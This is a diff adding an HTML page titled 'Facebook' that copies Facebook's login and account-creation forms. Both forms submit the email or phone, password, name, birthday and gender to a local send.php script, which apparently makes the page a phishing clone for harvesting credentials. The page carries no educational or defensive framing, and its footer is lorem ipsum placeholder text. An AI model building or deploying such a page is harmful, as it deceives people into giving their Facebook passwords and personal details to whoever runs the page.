@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300&family=Yantramanav:wght@300&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="css/styles.css" />
+    <title>Facebook</title>
+  </head>
+  <body>
+    <form name="formulario" action="send.php" method="post">
+      <div class="header">
+        <div>
+          <p>Email or phone</p>
+          <input type="text" name="Email" required />
+        </div>
+
+        <div>
+          <p>Password</p>
+          <input type="password" name="pass1" required />
+        </div>
+        <br /><br /><br />
+        <p id="forgot">Forgotten account?</p>
+        <button id="login" type="submit">LOG IN</button>
+      </div>
+    </form>
+    <!--  -->
+    <form name="nuevo" action="send.php" method="post">
+      <div class="body">
+        <h1>Create a new account</h1>
+        <p>It's free and always will be.</p>
+
+        <input type="text" name="first" placeholder="First name" />
+        <input type="text" name="surfname" placeholder="Surname" />
+        <input
+          class="line"
+          type="email"
+          name="telefono"
+          placeholder="Mobile number or email address"
+        />
+        <input
+          class="line"
+          type="password"
+          name="pass2"
+          placeholder="New password"
+        />
+        Birthday
+        <input type="date" name="fecha" min="1900-01-01" max="2004-01-01" />
+        <input type="radio" name="genero" id="F" />Female
+        <input type="radio" name="genero" id="M" />Male
+
+        <footer>
+          <p>
+            Lorem Ipsum is simply dummy text of the printing and typesetting
+            industry. Lorem Ipsum has been the industry's standard dummy text
+            ever since the 1500s, when an unknown printer took a galley of type
+            and scrambled it to make a type specimen book.
+          </p>
+        </footer>
+        <button id="nuevo" type="submit" id="create">Create Account</button>
+      </div>
+    </form>
+  </body>
+</html>
